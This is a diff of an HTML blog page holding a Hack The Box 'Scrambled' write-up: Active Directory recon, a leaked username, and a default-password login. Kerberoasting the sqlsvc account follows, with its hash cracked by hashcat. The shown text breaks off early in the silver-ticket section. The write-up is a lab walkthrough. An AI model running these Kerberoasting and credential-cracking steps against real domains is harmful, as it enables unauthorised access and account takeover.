@@ -1,19 +1,230 @@
-<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>HTB: Scrambled | kanyo's blog</title><meta property="og:title" content="HTB: Scrambled | kanyo's blog"><meta name=twitter:title content="HTB: Scrambled | kanyo's blog"><meta itemprop=name content="HTB: Scrambled | kanyo's blog"><meta name=application-name content="HTB: Scrambled | kanyo's blog"><meta property="og:site_name" content><meta name=description content="A Medium Windows box where NTLM is disabled domain-wide, forcing pure Kerberos. Kerberoasting yields sqlsvc, a silver ticket forged from its NT hash bypasses MSSQL access restrictions, and GodPotato closes it."><meta itemprop=description content="A Medium Windows box where NTLM is disabled domain-wide, forcing pure Kerberos. Kerberoasting yields sqlsvc, a silver ticket forged from its NT hash bypasses MSSQL access restrictions, and GodPotato closes it."><meta property="og:description" content="A Medium Windows box where NTLM is disabled domain-wide, forcing pure Kerberos. Kerberoasting yields sqlsvc, a silver ticket forged from its NT hash bypasses MSSQL access restrictions, and GodPotato closes it."><meta name=twitter:description content="A Medium Windows box where NTLM is disabled domain-wide, forcing pure Kerberos. Kerberoasting yields sqlsvc, a silver ticket forged from its NT hash bypasses MSSQL access restrictions, and GodPotato closes it."><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><link rel=alternate hreflang=en-gb href=https://chaelsoo.me/writeups/htb-scrambled/ title=English><meta name=generator content="Hugo 0.161.1"><meta property="og:url" content="https://chaelsoo.me/writeups/htb-scrambled/"><meta property="og:site_name" content="kanyo's blog"><meta property="og:title" content="HTB: Scrambled"><meta property="og:description" content="A Medium Windows box where NTLM is disabled domain-wide, forcing pure Kerberos. Kerberoasting yields sqlsvc, a silver ticket forged from its NT hash bypasses MSSQL access restrictions, and GodPotato closes it."><meta property="og:locale" content="en_gb"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2026-06-02T00:00:00+00:00"><meta property="article:modified_time" content="2026-06-02T00:00:00+00:00"><meta property="article:tag" content="Forge-Silver-Ticket"><meta property="article:tag" content="Kerberos"><meta property="article:tag" content="Mssql"><meta property="article:tag" content="Windows"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB: Scrambled"><meta name=twitter:description content="A Medium Windows box where NTLM is disabled domain-wide, forcing pure Kerberos. Kerberoasting yields sqlsvc, a silver ticket forged from its NT hash bypasses MSSQL access restrictions, and GodPotato closes it."><link rel=canonical href=https://chaelsoo.me/writeups/htb-scrambled/><link href=/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://chaelsoo.me/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://chaelsoo.me/ class=logo><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
-</a><input type=checkbox id=menu-trigger class=menu-trigger>
-<label for=menu-trigger><span class=menu-icon><svg width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class=menu-link href=/blogs/>Blogs</a></li><li><a class="menu-link active" href=/writeups/>Writeups</a></li><li><a class=menu-link href=/about/>About</a></li><li><a class=menu-link href=https://notes.chaelsoo.me>Cheatsheet</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg>
-<svg class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>HTB: Scrambled</h1><div class=post-meta><time datetime=2026-06-02T00:00:00+00:00 itemprop=datePublished>2 Jun 2026</time></div></header><img src=/images/writeups/htb-scrambled/htb-scrambled-pwned.png alt="HTB: Scrambled" style="width:100%;border-radius:.5rem;margin:1.5rem 0"><div class=toc-container><button class=toc-toggle type=button onclick=toggleToc()>Table of Contents</button><div class=toc-content id=tocContent><nav id=TableOfContents><ul><li><a href=#recon>Recon</a></li><li><a href=#username-and-credential-discovery>Username and Credential Discovery</a></li><li><a href=#kerberoasting>Kerberoasting</a></li><li><a href=#silver-ticket>Silver Ticket</a></li><li><a href=#shell-and-system>Shell and SYSTEM</a></li></ul></nav></div></div><div class=mini-toc id=miniToc><div class=mini-toc-header><div class=mini-toc-title>Contents</div><button class=mini-toc-minimize type=button onclick=toggleMiniToc() aria-label="Minimize TOC">
-<svg fill="currentColor" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1 8a.5.5.0 01.5-.5h13a.5.5.0 010 1h-13A.5.5.0 011 8zM7.646 4.146a.5.5.0 01.708.0l2 2a.5.5.0 01-.708.708L8.5 5.707V11.5a.5.5.0 01-1 0V5.707L6.354 6.854a.5.5.0 11-.708-.708l2-2z"/></svg></button></div><div class=mini-toc-content id=miniTocContent></div></div><div class=page-content><p>Windows DC, Kerberos-only environment. The intranet website has a news banner from 2021 explaining that NTLM was disabled after a breach. That single constraint changed everything about how to approach the box: no Pass-the-Hash, no NTLM relay, none of the usual tools that just work against most AD labs. Everything had to go through Kerberos tickets.</p><p>The silver ticket was the technique that unlocked MSSQL. The sqlsvc account had an SPN and was Kerberoastable, but it was also stuck in a NOACCESS group that blocked it from logging into SQL Server directly. Silver ticket forgery sidesteps that entirely. You forge the ticket as Administrator, signed with sqlsvc&rsquo;s NT hash, and the MSSQL service just trusts it. The DC never gets involved.</p><h2 id=recon>Recon</h2><p>Standard AD profile on 10.129.11.56. Kerberos on 88, LDAP on 389 and 636, SMB on 445, and MSSQL 2019 on 1433. WinRM was up too. The web server on port 80 stood out. IIS on a DC usually means something was put there deliberately.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -sC -sV -T4 10.129.11.56
-</span></span><span class=line><span class=cl>PORT     STATE SERVICE       VERSION
-</span></span><span class=line><span class=cl>53/tcp   open  domain        Simple DNS Plus
-</span></span><span class=line><span class=cl>80/tcp   open  http          Microsoft IIS httpd 10.0
-</span></span><span class=line><span class=cl>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
-</span></span><span class=line><span class=cl>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: scrm.local<span class=o>)</span>
-</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds?
-</span></span><span class=line><span class=cl>1433/tcp open  ms-sql-s      Microsoft SQL Server <span class=m>2019</span> 15.00.2000.00<span class=p>;</span> RTM
-</span></span><span class=line><span class=cl>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
-</span></span></code></pre></div><p>Domain is <code>scrm.local</code>, DC hostname is <code>DC1</code>. I added both to /etc/hosts and set up a Kerberos realm config pointing at the DC.</p><h2 id=username-and-credential-discovery>Username and Credential Discovery</h2><p>The website is a Scramble Corp intranet. Three pages: <code>index.html</code>, <code>support.html</code>, <code>newuser.html</code>. The support page gives away a username without realizing it. The instructions for collecting network info show a command prompt example. The path is <code>C:\Users\ksimpson></code>. That&rsquo;s a username.</p><p><img src=/images/writeups/htb-scrambled/web-support-page-username-leak.png alt="Scramble Corp support page showing a cmd.exe example with C:\Users\ksimpson> as the prompt, leaking the username"></p><p>The password reset page explains the other half:</p><p><img src=/images/writeups/htb-scrambled/web-password-reset-policy.png alt="Scramble Corp intranet showing the password reset policy: if IT is unavailable, leave your username and they will reset your password to match it"></p><p>Password resets default to username = password. So: <code>ksimpson:ksimpson</code>.</p><p>The homepage also had a news alert I noticed while clicking around:</p><p><img src=/images/writeups/htb-scrambled/web-ntlm-disabled-alert.png alt="Scramble Corp intranet news and alerts section showing a 2021 notice that NTLM authentication has been disabled across the entire network due to a security breach"></p><p>NTLM is gone. The full policy document was sitting in the Public SMB share:</p><p><img src=/images/writeups/htb-scrambled/web-security-measures-pdf.png alt="Scramble Corp “Additional Security Measures” PDF document explaining NTLM was disabled after an attacker used NTLM relaying, and that Kerberos “has absolutely no way anyone could exploit it”"></p><p>Two notable things in that document. First, they explain that Kerberos is &ldquo;definitely 100% secure and has absolutely no way anyone could exploit it,&rdquo; which is a hint if you&rsquo;ve ever read about silver tickets. Second, they say MSSQL access was also removed for everyone except network administrators, because credentials were previously stolen from the SQL database. That second restriction is what made a silver ticket necessary later.</p><p>Since NTLM is out, tools like nxc just fail silently. I needed a proper Kerberos TGT. <code>getTGT.py</code> handles this. It exchanges plaintext credentials for a ticket-granting ticket:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>getTGT.py scrm.local/ksimpson:ksimpson -dc-ip 10.129.11.56
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving ticket in ksimpson.ccache
-</span></span></code></pre></div><p>One thing that tripped me up: I had <code>default_realm = scrm.local</code> (lowercase) in <code>/etc/krb5.conf</code> and it kept failing. Kerberos realm names must be uppercase per RFC convention. Changed to <code>SCRM.LOCAL</code> and it worked immediately.</p><pre tabindex=0><code>[libdefaults]
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HTB: Scrambled | kanyo&#39;s blog</title>
+<meta property="og:title" content="HTB: Scrambled | kanyo&#39;s blog" />
+<meta name="twitter:title" content="HTB: Scrambled | kanyo&#39;s blog" />
+<meta itemprop="name" content="HTB: Scrambled | kanyo&#39;s blog" />
+<meta name="application-name" content="HTB: Scrambled | kanyo&#39;s blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="A Medium Windows box where NTLM is disabled domain-wide, forcing pure Kerberos. Kerberoasting yields sqlsvc, a silver ticket forged from its NT hash bypasses MSSQL access restrictions, and GodPotato closes it.">
+<meta itemprop="description" content="A Medium Windows box where NTLM is disabled domain-wide, forcing pure Kerberos. Kerberoasting yields sqlsvc, a silver ticket forged from its NT hash bypasses MSSQL access restrictions, and GodPotato closes it." />
+<meta property="og:description" content="A Medium Windows box where NTLM is disabled domain-wide, forcing pure Kerberos. Kerberoasting yields sqlsvc, a silver ticket forged from its NT hash bypasses MSSQL access restrictions, and GodPotato closes it." />
+<meta name="twitter:description" content="A Medium Windows box where NTLM is disabled domain-wide, forcing pure Kerberos. Kerberoasting yields sqlsvc, a silver ticket forged from its NT hash bypasses MSSQL access restrictions, and GodPotato closes it." />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/writeups/htb-scrambled/" title="English" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.161.1">
+
+    
+    <meta property="og:url" content="http://localhost:1313/writeups/htb-scrambled/">
+  <meta property="og:site_name" content="kanyo&#39;s blog">
+  <meta property="og:title" content="HTB: Scrambled">
+  <meta property="og:description" content="A Medium Windows box where NTLM is disabled domain-wide, forcing pure Kerberos. Kerberoasting yields sqlsvc, a silver ticket forged from its NT hash bypasses MSSQL access restrictions, and GodPotato closes it.">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-06-02T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-06-02T00:00:00+00:00">
+    <meta property="article:tag" content="Forge-Silver-Ticket">
+    <meta property="article:tag" content="Kerberos">
+    <meta property="article:tag" content="Mssql">
+    <meta property="article:tag" content="Windows">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: Scrambled">
+  <meta name="twitter:description" content="A Medium Windows box where NTLM is disabled domain-wide, forcing pure Kerberos. Kerberoasting yields sqlsvc, a silver ticket forged from its NT hash bypasses MSSQL access restrictions, and GodPotato closes it.">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/writeups/htb-scrambled/">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/blogs/">
+                        Blogs
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/writeups/">
+                        Writeups
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="https://notes.chaelsoo.me">
+                        Cheatsheet
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HTB: Scrambled</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-06-02T00:00:00&#43;00:00" itemprop="datePublished"> 2 Jun 2026 </time>
+                </div>
+                
+            </header>
+            
+            <img src="/images/writeups/htb-scrambled/htb-scrambled-pwned.png" alt="HTB: Scrambled" style="width:100%;border-radius:0.5rem;margin:1.5rem 0;" />
+            
+            <div class="toc-container">
+    <button class="toc-toggle" type="button" onclick="toggleToc()">Table of Contents</button>
+    <div class="toc-content" id="tocContent">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#username-and-credential-discovery">Username and Credential Discovery</a></li>
+    <li><a href="#kerberoasting">Kerberoasting</a></li>
+    <li><a href="#silver-ticket">Silver Ticket</a></li>
+    <li><a href="#shell-and-system">Shell and SYSTEM</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+<div class="mini-toc" id="miniToc">
+    <div class="mini-toc-header">
+        <div class="mini-toc-title">Contents</div>
+        <button class="mini-toc-minimize" type="button" onclick="toggleMiniToc()" aria-label="Minimize TOC">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
+            </svg>
+        </button>
+    </div>
+    <div class="mini-toc-content" id="miniTocContent"></div>
+</div>
+            <div class="page-content">
+                <p>Windows DC, Kerberos-only environment. The intranet website has a news banner from 2021 explaining that NTLM was disabled after a breach. That single constraint changed everything about how to approach the box: no Pass-the-Hash, no NTLM relay, none of the usual tools that just work against most AD labs. Everything had to go through Kerberos tickets.</p>
+<p>The silver ticket was the technique that unlocked MSSQL. The sqlsvc account had an SPN and was Kerberoastable, but it was also stuck in a NOACCESS group that blocked it from logging into SQL Server directly. Silver ticket forgery sidesteps that entirely. You forge the ticket as Administrator, signed with sqlsvc&rsquo;s NT hash, and the MSSQL service just trusts it. The DC never gets involved.</p>
+<h2 id="recon">Recon</h2>
+<p>Standard AD profile on 10.129.11.56. Kerberos on 88, LDAP on 389 and 636, SMB on 445, and MSSQL 2019 on 1433. WinRM was up too. The web server on port 80 stood out. IIS on a DC usually means something was put there deliberately.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sC -sV -T4 10.129.11.56
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp   open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp   open  http          Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">1433/tcp open  ms-sql-s      Microsoft SQL Server <span class="m">2019</span> 15.00.2000.00<span class="p">;</span> RTM
+</span></span><span class="line"><span class="cl">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
+</span></span></code></pre></div><p>Domain is <code>scrm.local</code>, DC hostname is <code>DC1</code>. I added both to /etc/hosts and set up a Kerberos realm config pointing at the DC.</p>
+<h2 id="username-and-credential-discovery">Username and Credential Discovery</h2>
+<p>The website is a Scramble Corp intranet. Three pages: <code>index.html</code>, <code>support.html</code>, <code>newuser.html</code>. The support page gives away a username without realizing it. The instructions for collecting network info show a command prompt example. The path is <code>C:\Users\ksimpson&gt;</code>. That&rsquo;s a username.</p>
+<p><img src="/images/writeups/htb-scrambled/web-support-page-username-leak.png" alt="Scramble Corp support page showing a cmd.exe example with C:\Users\ksimpson&gt; as the prompt, leaking the username"></p>
+<p>The password reset page explains the other half:</p>
+<p><img src="/images/writeups/htb-scrambled/web-password-reset-policy.png" alt="Scramble Corp intranet showing the password reset policy: if IT is unavailable, leave your username and they will reset your password to match it"></p>
+<p>Password resets default to username = password. So: <code>ksimpson:ksimpson</code>.</p>
+<p>The homepage also had a news alert I noticed while clicking around:</p>
+<p><img src="/images/writeups/htb-scrambled/web-ntlm-disabled-alert.png" alt="Scramble Corp intranet news and alerts section showing a 2021 notice that NTLM authentication has been disabled across the entire network due to a security breach"></p>
+<p>NTLM is gone. The full policy document was sitting in the Public SMB share:</p>
+<p><img src="/images/writeups/htb-scrambled/web-security-measures-pdf.png" alt="Scramble Corp “Additional Security Measures” PDF document explaining NTLM was disabled after an attacker used NTLM relaying, and that Kerberos “has absolutely no way anyone could exploit it”"></p>
+<p>Two notable things in that document. First, they explain that Kerberos is &ldquo;definitely 100% secure and has absolutely no way anyone could exploit it,&rdquo; which is a hint if you&rsquo;ve ever read about silver tickets. Second, they say MSSQL access was also removed for everyone except network administrators, because credentials were previously stolen from the SQL database. That second restriction is what made a silver ticket necessary later.</p>
+<p>Since NTLM is out, tools like nxc just fail silently. I needed a proper Kerberos TGT. <code>getTGT.py</code> handles this. It exchanges plaintext credentials for a ticket-granting ticket:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getTGT.py scrm.local/ksimpson:ksimpson -dc-ip 10.129.11.56
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in ksimpson.ccache
+</span></span></code></pre></div><p>One thing that tripped me up: I had <code>default_realm = scrm.local</code> (lowercase) in <code>/etc/krb5.conf</code> and it kept failing. Kerberos realm names must be uppercase per RFC convention. Changed to <code>SCRM.LOCAL</code> and it worked immediately.</p>
+<pre tabindex="0"><code>[libdefaults]
     default_realm = SCRM.LOCAL
 
 [realms]
@@ -24,46 +235,220 @@
 [domain_realm]
     .scrm.local = SCRM.LOCAL
     scrm.local = SCRM.LOCAL
-</code></pre><p>My local resolver also checks <code>/etc/resolv.conf</code> before <code>/etc/hosts</code>, so I prefixed every Kerberos-aware command with <code>KRB5_CONFIG=/etc/krb5.conf KRB5CCNAME=&lt;ticket>.ccache</code> to force the right config.</p><h2 id=kerberoasting>Kerberoasting</h2><p>With a valid TGT for ksimpson, I could enumerate SPNs and request service tickets. Kerberoasting works because any authenticated domain user can ask the DC for a TGS for any registered SPN. The ticket comes back encrypted with the service account&rsquo;s NT hash. That hash never leaves the domain, but the encrypted blob you get is enough to crack offline.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>KRB5CCNAME</span><span class=o>=</span>ksimpson.ccache <span class=nv>KRB5_CONFIG</span><span class=o>=</span>/etc/krb5.conf <span class=se>\
-</span></span></span><span class=line><span class=cl>  GetUserSPNs.py -k -no-pass <span class=se>\
-</span></span></span><span class=line><span class=cl>  -dc-host dc1.scrm.local -dc-ip 10.129.11.56 <span class=se>\
-</span></span></span><span class=line><span class=cl>  scrm.local/ksimpson -request
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>ServicePrincipalName          Name    
-</span></span><span class=line><span class=cl>----------------------------  ------  
-</span></span><span class=line><span class=cl>MSSQLSvc/dc1.scrm.local:1433  sqlsvc            
-</span></span><span class=line><span class=cl>MSSQLSvc/dc1.scrm.local       sqlsvc            
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nv>$krb5tgs$23$*</span>sqlsvc<span class=nv>$SCRM</span>.LOCAL$...
-</span></span></code></pre></div><p>One SPN: <code>MSSQLSvc/dc1.scrm.local:1433</code> mapped to <code>sqlsvc</code>. Threw the hash at rockyou:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hashcat -m <span class=m>13100</span> sqlsvc.hash /usr/share/wordlists/rockyou.txt
-</span></span><span class=line><span class=cl><span class=nv>$krb5tgs$23$*</span>sqlsvc<span class=nv>$SCRM</span>.LOCAL$...:Pegasus60
-</span></span></code></pre></div><p><code>sqlsvc:Pegasus60</code>.</p><h2 id=silver-ticket>Silver Ticket</h2><p>The obvious next step is connecting to MSSQL with those credentials. Direct login fails:</p><pre tabindex=0><code>ERROR(DC1): Line 1: Login failed for user &#39;SCRM\sqlsvc&#39;.
